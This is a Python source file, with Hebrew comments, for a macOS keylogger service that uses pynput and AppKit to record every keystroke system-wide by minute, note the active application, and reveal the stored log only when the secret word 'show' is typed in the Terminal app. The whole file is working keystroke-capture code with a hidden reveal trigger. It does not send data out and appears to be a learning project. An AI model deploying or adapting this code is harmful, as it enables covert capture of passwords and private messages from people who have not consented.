from typing import Dict
from collections import deque
from datetime import datetime
from pynput.keyboard import Listener, Key
import AppKit
from key_logger_interface import KeyLoggerInterface


class KeyLoggerService(KeyLoggerInterface):
    def __init__(self):
        """אתחול משתנים לניהול הרישום"""
        self.magic_word = "show"
        self.magic_app = 'המסוף'
        self.key_logs_by_minute = {}
        self.last_keys = deque(maxlen=len(self.magic_word))
        self.listener = None
        self.is_listening = False


    def start_logging(self) -> None:
        """מתחיל את המעקב אחרי מקשים"""
        self.is_listening = True

        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        """מפסיק את המעקב אחרי מקשים"""
        self.is_listening = False
        if self.listener:
            self.listener.stop()
        print("\nLogging stopped.")

    def get_logged_keys(self) -> Dict[str, str]:


        """מחזיר את המקשים שנלחצו עד כה ומאפס את המילון"""
        keys = self.key_logs_by_minute
        self.key_logs_by_minute = {}  # מאפס את המילון
        return keys

    def print_key_logs(self) -> None:
        """מדפיס את כל המקשים שנרשמו"""
        for timestamp, keys in self.key_logs_by_minute.items():
            print(f"-----{timestamp}-----")
            print(keys)

    # -------- פונקציות פרטיות לניהול הלוגיקה --------

    def get_key_format(self, key) -> str:
        """מחזירה את המקש בפורמט מתאים"""
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif hasattr(key, 'name') and key.name is not None:
            return f"[{key.name}]"
        return "[UNKNOWN]"

    def get_active_application(self) -> str:
        """מחזירה את שם האפליקציה הפעילה כרגע"""
        app = AppKit.NSWorkspace.sharedWorkspace().activeApplication()
        return app.get('NSApplicationName')

    def log_key(self, key_name: str, active_app: str) -> None:
        """רושם את ההקשה לפי זמן ואפליקציה פעילה"""
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M")
        if current_time in self.key_logs_by_minute:
            self.key_logs_by_minute[current_time] += key_name
        else:
            self.key_logs_by_minute[current_time] = key_name
        self.last_keys.append((key_name, active_app))

    def is_time_to_show(self) -> bool:
        """בודקת אם המשתמש הקליד את המילה הסודית באפליקציה הנכונה"""
        return "".join(t[0] for t in self.last_keys) == self.magic_word and \
            all(t[1] == self.magic_app for t in self.last_keys)

    def on_press(self, key) -> None:
        """פונקציה שמטפלת באירוע לחיצת מקש"""
        key_name = self.get_key_format(key)
        active_app = self.get_active_application()
        self.log_key(key_name, active_app)

        print(f"Active app: {active_app}")
        print(f"You pressed '{key_name}'")

        if key == Key.esc:
            self.stop_logging()

        if self.is_time_to_show():
            self.print_key_logs()
            self.key_logs_by_minute.clear()
